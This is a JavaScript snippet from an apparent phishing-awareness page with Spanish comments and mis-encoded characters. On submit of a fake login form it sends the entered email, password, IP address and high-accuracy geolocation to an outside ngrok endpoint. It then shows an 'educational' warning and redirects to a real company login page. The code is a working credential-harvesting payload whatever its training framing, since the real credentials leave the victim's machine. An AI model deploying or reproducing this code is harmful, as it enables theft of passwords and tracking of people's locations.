<script>
document.getElementById('phishing-login-form').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const email = document.getElementById('login').value;
    const password = document.getElementById('password').value;
    
    // Obtener ubicaciÃ³n
    const location = await getLocation();
    
    // Datos a enviar al endpoint
    const formData = {
        email: email,
        password: password,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        page: 'gama-login-phishing',
        ip: await getIPAddress(),
        latitude: location.latitude,
        longitude: location.longitude,
        accuracy: location.accuracy
    };
    
    try {
        // Enviar datos al endpoint
        const response = await fetch(`https://semiglobularly-unphased-amira.ngrok-free.dev/api/v1/oddo/login`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(formData)
        });
        
        if (response.ok) {
            console.log('âœ… Datos enviados correctamente al endpoint');
        } else {
            console.log('âš ï¸ Error al enviar datos, pero continuamos con el flujo');
        }
    } catch (error) {
        console.log('ðŸŒ No se pudo conectar al endpoint, pero continuamos');
    }
    
    // Mostrar mensaje educativo (siempre se ejecuta)
    showEducationalAlert(email, password);
});

// FunciÃ³n para obtener la ubicaciÃ³n
function getLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            console.log('GeolocalizaciÃ³n no soportada');
            resolve({ latitude: null, longitude: null, accuracy: null });
            return;
        }

        navigator.geolocation.getCurrentPosition(
            (position) => {
                resolve({
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy
                });
            },
            (error) => {
                console.log('Error obteniendo ubicaciÃ³n:', error.message);
                resolve({ latitude: null, longitude: null, accuracy: null });
            },
            {
                enableHighAccuracy: true,
                timeout: 10000, // 10 segundos
                maximumAge: 60000 // 1 minuto
            }
        );
    });
}

// FunciÃ³n para obtener la direcciÃ³n IP
async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return 'No disponible';
    }
}

// FunciÃ³n para mostrar el mensaje educativo
function showEducationalAlert(email, password) {
    alert('ðŸ” PRUEBA DE SEGURIDAD - PHISHING DETECTADO\n\n' +
          'Has introducido tus credenciales en un formulario falso:\n\n' +
          'Email: ' + email + '\n' +
          'Password: ' + password + '\n\n' +
          'âš ï¸  EN UN ESCENARIO REAL, ESTO HABRÃA COMPROMETIDO TU CUENTA  âš ï¸\n\n' +
          'Lecciones de seguridad:\n' +
          'âœ… Verifica siempre la URL del sitio oficial\n' +
          'âœ… Revisa el certificado SSL\n' +
          'âœ… No reutilices contraseÃ±as\n' +
          'âœ… Habilita autenticaciÃ³n de dos factores\n' +
          'âœ… Reporta sitios sospechosos al departamento de TI');
    
    // Redirigir a pÃ¡gina de concienciaciÃ³n
    setTimeout(() => {
        window.location.href = 'https://www.gamaconsumibles.com.mx/en/web/login';
    }, 1000);
}
</script>